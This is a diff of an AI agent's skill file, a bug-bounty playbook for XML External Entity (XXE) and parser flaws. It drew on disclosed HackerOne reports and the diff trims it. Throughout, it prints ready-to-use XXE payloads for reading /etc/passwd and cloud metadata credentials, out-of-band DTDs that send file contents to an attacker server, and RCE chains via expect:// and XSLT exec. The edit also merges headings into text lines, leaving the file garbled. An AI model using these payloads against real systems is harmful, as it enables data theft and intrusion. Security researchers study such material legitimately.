@@ -4,13 +4,13 @@ description: "Use for XML/SOAP/SAML/SVG/DOCX parsers that resolve external entit
 agent_created: true
 ---
 
-# XML External Entity and Parser Flaws — unified skill
+# XML External Entity and Parser Flaws — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 42 valid HackerOne reports (9 paid / 21%)
+## Corpus signal — 42 valid reports (9 paid / 21%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,107 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 | parser confusion / normalization | 5 |
 | public source-code / repo review | 5 |
 | JWT / token / base64 decode | 4 |
-| cloud metadata / IAM abuse | 4 |
-| error message / stack trace probing | 3 |
-| fuzzing / wordlist brute force | 3 |
-| cache / CDN / unkeyed header | 3 |
-| deserialization / gadget chain | 3 |
-| HTTP method / verb tampering | 3 |
-| OAST / DNS / HTTP callback proof | 3 |
-| third-party data / paste / breach reuse | 3 |
-| webhook / OAuth / SAML / integration abuse | 2 |
-| unauthenticated / removed-cookie test | 2 |
-| public bucket / storage exposure | 2 |
-| swap object ID / parameter value | 2 |
-| intercept & replay request in Burp | 2 |
-| git history / exposed .git | 2 |
-| verbose debug / framework fingerprint | 1 |
-| template injection (SSTI) | 1 |
-| API docs / Swagger / introspection | 1 |
-| WAF / sanitizer / filter bypass | 1 |
-
-### Parameters observed in writeups
-
-`version` (4), `encoding` (4), `type` (4), `debug` (2), `max-age` (2), `pct` (1), `rua` (1), `reproduce` (1), `username` (1), `password` (1), `referenceid` (1), `code` (1), `message` (1), `read` (1), `resource` (1), `status` (1), `_hxpage` (1), `max_file_size_kb` (1), `allow_file_type_list` (1), `hx_page_name` (1), `charset` (1)
-
-### Bypass primitives observed
-
-`content-type` (13), `blind` (10), `bypass` (8), `out-of-band` (2), `bypassed` (1), `time-based` (1)
-
-### Impact language observed
-
-`rce` (10), `exfiltrate` (10), `admin` (8), `credential` (7), `remote code execution` (6), `arbitrary file` (6), `password` (6), `unauthorized` (3), `arbitrary read` (2), `localhost` (2), `internal network` (2), `sensitive data` (2), `secret` (2), `exfiltration` (2), `sensitive information` (2), `arbitrary command` (2), `unauthorised` (1), `api key` (1), `cloud metadata` (1), `exfiltrating` (1)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [347139](https://hackerone.com/reports/347139) — LFI and SSRF via XXE in emblem editor
-
-Rockstar Games · $1500 · critical
-
-This summary is provided by the researcher who submitted this report, @alexbirsan . ___________________________________________________________________________________________________________________________ About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem. For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar: 1. Double forward slash to reference an SMB path: This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server. 2. Classic XXE: **exfil.dtd** This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`). 3. Bonus method - XIncludes It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward. The final POC looked like this: {F293137} About one year after I started messing with the emblem editor, I finally f
-
-#### [500515](https://hackerone.com/reports/500515) — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
-
-Starbucks · no bounty — still valid · critical
-
-**Description:** Hi,guys,when i was visited the jobs of starbucks websites in China( i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. ## Steps To Reproduce: Upload and XXE vulnerability: 1. Log in to the user, enter the personal information settings page, click Upload Image 2. Intercept https access information through Burp suite 3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html" 4. Get the server's response information,visited the uploaded file URL. 5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like >POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp; or change the "HX_PAGE_NAME" params of xml date by post >POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1 HX_PAGE_NAME=&quot;tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml&quot; post the edited request,
-
-#### [248668](https://hackerone.com/reports/248668) — XXE on sms-be-vip.twitter.com in SXMP Processor
-
-X / xAI · no bounty — still valid · medium
-
-Hi team, ##What type of issue are you reporting? Does it align to a CWE or OWASP issue? I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to ##How does a user reproduce your issue? To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request: POST /api/sxmp/1.0 HTTP/1.1 Host: sms-be-vip.twitter.com Connection: close Content-Type: text/xml Content-Length: 481 <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <operation type="deliver"> <account username="abc" password="a"/> <deliverRequest referenceId="MYREF102020022"> <operatorId>&file;</operatorId> <sourceAddress type="network">40404</sourceAddress> <destinationAddress type="international">123</destinationAddress> <text encoding="ISO-8859-1">a</text> </deliverRequest> </operation> </code> In response, the server returned its /etc/passwd file in an error message: <?xml version="1.0"?> <operation type="deliver"> <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/> </operation> In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a U
-
-#### [483774](https://hackerone.com/reports/483774) — XXE on https://duckduckgo.com
-
-DuckDuckGo · no bounty — still valid · critical
-
-An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on via `u` parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system. This issue was patched. Additionally, we intend to retire the endpoint in the very near future. Big thanks to @mik317 for reporting this issue!
-
-#### [486732](https://hackerone.com/reports/486732) — Partial bypass of #483774 with Blind XXE on https://duckduckgo.com
-
-DuckDuckGo · no bounty — still valid · high
-
-**Summary:** Hi DuckDuckGo team, I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree. **Steps for reproduction:** 1. Attacker creates a public server and hosts a file with the following content: 2. User goes on 3. The ` resource will be requested by an host {F413045} I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain. ## Impact Blind XXE leads to `dos` and `blind injection`.
-
-#### [500515](https://hackerone.com/reports/500515) — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
-
-Starbucks · no bounty — still valid · critical
-
-**Description:** Hi,guys,when i was visited the jobs of starbucks websites in China( i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files. ## Steps To Reproduce: Upload and XXE vulnerability: 1. Log in to the user, enter the personal information settings page, click Upload Image 2. Intercept https access information through Burp suite 3. addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html" 4. Get the server's response information,visited the uploaded file URL. 5. uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like >POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp; or change the "HX_PAGE_NAME" params of xml date by post >POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1 HX_PAGE_NAME=&quot;tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml&quot; post the edited request,
-
-#### [248668](https://hackerone.com/reports/248668) — XXE on sms-be-vip.twitter.com in SXMP Processor
-
-X / xAI · no bounty — still valid · medium
-
-Hi team, ##What type of issue are you reporting? Does it align to a CWE or OWASP issue? I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to ##How does a user reproduce your issue? To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request: POST /api/sxmp/1.0 HTTP/1.1 Host: sms-be-vip.twitter.com Connection: close Content-Type: text/xml Content-Length: 481 <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <operation type="deliver"> <account username="abc" password="a"/> <deliverRequest referenceId="MYREF102020022"> <operatorId>&file;</operatorId> <sourceAddress type="network">40404</sourceAddress> <destinationAddress type="international">123</destinationAddress> <text encoding="ISO-8859-1">a</text> </deliverRequest> </operation> </code> In response, the server returned its /etc/passwd file in an error message: <?xml version="1.0"?> <operation type="deliver"> <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/> </operation> In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a U
-
-### Recurring approach patterns from real reports
-
-- 2× i was able to extract text files from the server and http responses by rendering them on my crew emblem
-- 1× hi sir i am new hacker in hackerone platform i am glad to join paragonie bounty program i want to report a very critical bug that is i found dmarc missing for your domain paragonie com add dmarc record as soon as possible
-- 1× many senders have a complex email environment with many systems sending email often including 3rd party service providers
-- 1× dawgyg was able to exploit this vulnerability by crafting an xml request that revealed sensitive local system information
-- 1× version i tested this against the latest stable source available a couple fo days ago may running weblate dev steps to reproduce i have included a live exploit testproject testcomponent en gb xlf that works with the hello data backing the demo website log in as a user that has permission to upload translation files
-- 1× i ve identified an xxe vulnerability in the cloudhopper sxmp servlet on sms be vip twitter com which discloses local files to an external attacker and allows web requests to be sent
-- 1× summary the project site audit function is vulnerable to xxe when parsing sitemap xml files
-- 1× about one year after i started messing with the emblem editor i finally found a full ssrf and lfi
-- 1× decoding the hex value we get the challenge url path traversal local file read on the website i found two important endpoints generate php and memes php
-- 1× at the generate php i started doing some manual fuzzing trying some command injection like id and template injections like but nothing seemed to work
-- 1× path traversal in template parameter etc passwd output first i tried reading some default configurations files like proc self environ and proc self cmdline without any usable information
-- 1× while trying to figure out the next step i remembered that i haven t looked at the includes header php file because i thought that it was useless
-- 1× as it was late of night and i was really tired i just created all by hand counting the length of the string and all
-- 1× the serialized class without the payload looks like this now i have to insert the xxe payload note that it must have toptext or a bottomtext tag to output the result to the page at first i tried a rce payload with expect
-- 1× but no output was generated after that i tried to output the stdout to a server with expect curl with no success
-- 1× as i couldn t think of any other way to complete the challenge i tried another technique to achieve ssrf with php filter read convert base64 encode resource and now it worked
-- 1× after that i tried the aws metadata url because the server was on aws to try to get any credentials but it didn t work
-- 1× to find the ip port i used the first local file read to read proc net tcp decoding the hex 0100007f we get so this must be the next step
-- 1× pickle injection rce using the ssrf to get the sending the debug to status it shows a python s pickle serialized data encoded in base64
-- 1× so we have to send a status parameter i tried to send the base64 he outputs on the status and it worked
-- 1× pickle is notorious vulnerable to rce so i tried a simple exploit available at sending this to update status debug status y3bvc2l4cnn5c3rlbqpwmaoouydpzcckcdekdhaycljwmwoucg 3d 3d showed but no output
-- 1× i was able to identify xxe on the it is cve in oracle peoplesoft cve poc i determined that instance is available on localhost port so it s possible to access pspc services adminservice via xxe where h1testservice is test service name i m trying to create
-- 1× the result i created new service on server
-- 1× the avatar picture upload functionality is prone to a xxe attack when parsing the image file
 
 ## Corpus-backed method (this class)
 
@@ -156,18 +55,13 @@ Hi team, ##What type of issue are you reporting? Does it align to a CWE or OWASP
 - XXE -> SSRF -> metadata.
 - XXE -> local file read -> credentials -> further access.
 
-### Probes
-
-- <!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/hostname'>]>, OOB entity to callback, SVG with external reference.
-
 ### Veteran tip
 
 Parser differences between endpoints in the same app are common — test each XML entry point separately.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -220,10 +114,7 @@ Start here. These are the highest-yield tests for this class.
 - Hidden attack surface per PortSwigger: XInclude (`<xi:include href=...>`) when `DOCTYPE` is blocked, file-upload XXE, and `Content-Type`-converted XXE.
 - Error-message channels matter as much as reflection: verbose Java/JDOM/Xerces, Spring, and `SAML exception:` / `Error creating JDOM document from XML string:` strings turn parser errors into an exfiltration channel.
 - WAF signal: Imperva and others blocking the literal word `DOCTYPE` anywhere in a POST body — confirm the block, then look for a parser path where the DTD is inside a ZIP/XML part rather than the raw body.
-- 2025-2026 real targets: Akamai CloudTest CVE-2025-49493 (SOAP/WSDL, Java 1.8), NASA unauth SAML XXE (Bugcrowd P1, 2025), ArubaOS 8.13.2.0 pre-auth XXE on port 32000, Adobe Commerce CosmicSting CVE-2024-34102.
-
-### Signals and surfaces
-
+- 2025-2026 real targets: Akamai CloudTest CVE-2025-49493 (SOAP/WSDL, Java 1.8), NASA unauth SAML XXE (Bugcrowd P1, 2025), ArubaOS 8.13.2.0 pre-auth XXE on port 32000, Adobe Commerce CosmicSting CVE-2024-34102.### Signals and surfaces
 ### Signal
 
 - Reports: **64** · paid: **11**
@@ -273,10 +164,7 @@ XXE is a critical-severity vulnerability that consistently pays at the top of bu
 - **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
 - **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Payloads & probes
 
 - `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
@@ -449,10 +337,7 @@ Transfer-Encoding: chunked
 
 <!-- Nested encoding -->
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
-```
-
-### Validation and proof
-
+```### Validation and proof
 ### Parameter entities / OOB
 
 ```text
@@ -577,10 +462,7 @@ Before writing the report, answer all three:
 Content-Type: application/json; charset=xml
 Content-Type: application/xml+json
 # Or simply omit Content-Type and let the server sniff
-```
-
-### Escalation and related chains
-
+```### Escalation and related chains
 ### Escalation chains
 
 - XXE -> file read -> creds.
@@ -605,10 +487,7 @@ Content-Type: application/xml+json
 - **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
 - **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
 - **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
-- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.
-
-### Tools and wordlists
-
+- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.### Tools
 ### Tools
 
 `Burp` · `xxe-exploit` · `interactsh` · `nuclei`
@@ -668,10 +547,7 @@ grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .
 grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
 ```
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -716,10 +592,7 @@ lxml
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://portswigger.net/web-security/xxe/blind
-2. https://ultrared.ai/blog/xxe-aws-credential-theft
-
-### Additional notes
-
+2. https://ultrared.ai/blog/xxe-aws-credential-theft### Additional notes
 ### Classic file read
 
 ```text
@@ -1053,513 +926,8 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
     - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
     - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# XXE — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
-
-- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`
-
-- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`
-
-- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`
-
-
-
-## Payload bank
-
-
-
-**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.
-
-
-
-### Classic file read
-
-
-
-```text
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-
-<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
-
-```
-
-
-
-### Parameter entities / OOB
-
-
-
-```text
-
-<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
-
-<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
-
-<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
-
-<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
-
-```
-
-
-
-### SSRF / cloud metadata
-
-
-
-```text
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
-
-```
-
-
-
-### XInclude / SVG / Office
-
-
-
-```text
-
-<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
-
-<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
-
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
-
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
-
-```
-
-
-
-### Filter bypass
-
-
-
-```text
-
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-
-<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
-
-<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
-
-```
-
-
-
-Copyable lists:
-
-- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)
-
-- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |
-
-| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |
-
-| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |
-
-| 2× | `%eval` |
-
-| 2× | `Content-Type: application/xml;charset=UTF-8` |
-
-| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |
-
-| 2× | `<!DOCTYPE foo [` |
-
-| 2× | `<params>` |
-
-| 2× | `<offset>0</offset>` |
-
-| 2× | `<queryParams>` |
-
-| 2× | `<query>&xxe;</query>` |
-
-| 2× | `<sortBy>relevance</sortBy>` |
-
-| 2× | `<fieldList>["id", "title"]</fieldList>` |
-
-| 2× | `</queryParams>` |
-
-| 2× | `<source>marketplace</source>` |
-
-| 2× | `<rows>5</rows>` |
-
-| 2× | `</params>` |
-
-| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |
-
-| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |
-
-| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |
-
-
-
-## Parameters observed
-
-
-
-`debug` · `status` · `type` · `top-text` · `bottom-text` · `id` · `_hxpage` · `max_file_size_kb` · `allow_file_type_list` · `EventAction` · `EventDate` · `url` · `RelayState` · `method` · `dl`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |
-
-| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |
-
-| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \
-
-     -mr '<hit-marker>' -rate 20
-
-```
-
-
-
-## Nuclei
-
-
-
-Point at XML/SOAP/SAML/SVG/office upload endpoints.
-
-
-
-```sh
-
-nuclei -u https://target -tags xxe \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt
-
-nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \
-
-       -rl 40 -o nuclei_xxe_xxe.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
-
-       -rl 40 -o nuclei_xxe_generic.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-
-
-## Payload & Detection Patterns
-
-
-
-### Error-based exfil via local-DTD repurposing (zero network egress)
-
-When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:
-
-```xml
-
-<!DOCTYPE foo [
-
-  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-
-  <!ENTITY % ISOamso '
-
-    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-
-    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
-
-    %eval; %err;'>
-
-  %local_dtd; ]>
-
-```
-
-Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)
-
-
-
-### Classic In-Band File Read
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-
-<!DOCTYPE foo [
-
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-
-]>
-
-<root><data>&xxe;</data></root>
-
-```
-
-
-
-### Windows Equivalent
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-
-<!DOCTYPE foo [
-
-  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
-
-]>
-
-<root><data>&xxe;</data></root>
-
-```
-
-
-
-### Blind OOB — DNS/HTTP Callback
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-
-<!DOCTYPE foo [
-
-  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
-
-]>
-
-<root><data>&xxe;</data></root>
-
-```
-
-
-
-### Blind OOB — File Exfiltration via Parameter Entity (two-stage)
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-
-<!DOCTYPE foo [
-
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-
-  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
-
-  %dtd;
-
-]>
-
-<root><data>trigger</data></root>
-
-```
-
-
-
-**evil.dtd (hosted on attacker server):**
-
-```xml
-
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
-
-%all;
-
-```
-
-
-
-### SSRF via XXE (AWS Metadata)
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-
-<!DOCTYPE foo [
-
-  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-
-]>
-
-<root><data>&ssrf;</data></root>
-
-```
-
-
-
-### SVG XXE (for file upload endpoints)
-
-```xml
-
-<?xml version="1.0" standalone="yes"?>
-
-<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
-
-<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
-
-  <text font-size="14" x="0" y="16">&xxe;</text>
-
-</svg>
-
-```
-
-
-
-### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`
-
-```xml
-
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-
-<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
-
-```
-
-
-
-### Content-Type Swap (JSON to XML)
-
-```bash
-
-# Original JSON request
-
-curl -X POST https://target.com/api/endpoint \
-
-  -H "Content-Type: application/json" \
-
-  -d '{"user":"test"}'
-
-
-
-# Converted to XML for XXE testing
-
-curl -X POST https://target.com/api/endpoint \
-
-  -H "Content-Type: application/xml" \
-
-  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
-
-```
-
-
-
-### Grep Patterns for Source Code Review
-
-```bash
-
-# PHP
-
-grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .
-
-
-
-# Java
-
